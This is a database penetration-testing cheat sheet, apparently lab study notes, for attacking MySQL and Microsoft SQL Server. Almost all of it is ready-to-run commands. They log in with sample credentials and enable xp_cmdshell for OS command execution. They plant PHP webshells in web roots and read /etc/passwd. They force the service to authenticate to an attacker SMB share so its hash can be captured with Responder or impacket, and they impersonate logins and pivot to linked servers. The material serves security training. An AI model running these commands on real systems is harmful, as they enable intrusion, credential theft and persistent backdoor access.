- [MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. 
- Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.
# Enumeration
- By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. 
- However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port.
## Banner Grabbing
```shell
nmap -Pn -sV -sC -p1433 10.10.10.125
```
# Protocol Specific Attacks
### MySQL
#### MySQL - Connecting to the SQL Server
```shell
mysql -u julio -pPassword123 -h 10.129.20.13
```
#### Sqlcmd - Connecting to the SQL Server
```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
### MSSQL
```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
#### mssqlclient.py
```shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```
# SQL Syntax
#### MySQL
```shell
SHOW DATABASES;
```
```shell
USE htbusers;
```
```shell
SHOW TABLES;
```
```shell
SELECT * FROM users;
```
#### MSSQL
```cmd
SELECT name FROM master.dbo.sysdatabases
```
```cmd
USE htbusers
```
```cmd
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
```
```cmd
SELECT * FROM users
```
# Execute Commands
### XP_CMDSHELL
```cmd
xp_cmdshell 'whoami'
GO
```
If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
# Write Local Files
#### MySQL - Write Local File
```shell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
#### MySQL - Secure File Privileges
```shell
show variables like "secure_file_priv";
```
#### MSSQL - Enable Ole Automation Procedures
```cmd
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
#### MSSQL - Create a File
```cmd-session
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```
# Read Local Files
#### Read Local Files in MSSQL
```cmd-session
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```
#### MySQL - Read Local Files in MySQL
```shell
select LOAD_FILE("/etc/passwd");
```
# Capture MSSQL Service Hash
#### XP_DIRTREE Hash Stealing
```cmd-session
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```
#### XP_SUBDIRS Hash Stealing
```cmd-session
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```
#### XP_SUBDIRS Hash Stealing with Responder
```shell
sudo responder -I tun0
```
#### XP_SUBDIRS Hash Stealing with impacket
```shell
sudo impacket-smbserver share ./ -smb2support
```
# Impersonate Existing Users with MSSQL
#### Identify Users that We Can Impersonate
```cmd
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```
#### Verifying our Current User and Role
```cmd
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```
#### Impersonating the SA User
```cmd
EXECUTE AS LOGIN = 'john'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
# Communicate with Other Databases with MSSQL
#### Identify linked Servers in MSSQL
```cmd
SELECT srvname, isremote FROM sysservers
GO
```
```cmd
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```
